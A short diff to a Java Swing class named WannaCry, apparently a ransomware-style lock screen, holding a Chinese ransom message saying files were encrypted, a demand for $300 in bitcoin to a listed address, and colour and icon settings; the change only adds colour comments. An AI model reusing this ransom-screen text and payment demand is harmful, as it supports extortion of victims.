@@ -39,8 +39,8 @@ class WannaCry extends JFrame {
 	private static String TEXT = "我的电脑出了什么问题？\n您的一些重要文件被我加密保存了。";
 	private static String PAY = "Send $300 worth of bitcoin to this address:";
 	private static String ADDRESS = "13AM4VM2dhxYgXeQepoHkHSQuy6NgaEb94";
-	private static String TOPIC_COLOR = "#8B2323";
-//	private static String TOPIC_COLOR = "#228B22";
+	private static String TOPIC_COLOR = "#8B2323";//红
+//	private static String TOPIC_COLOR = "#228B22";//绿
 	private static String PATH_ICON = "/resource/icon.png";
 	private static String PATH_LOCK = "/resource/lock.png";
 	private static String PATH_COLOR = "/resource/color.png";
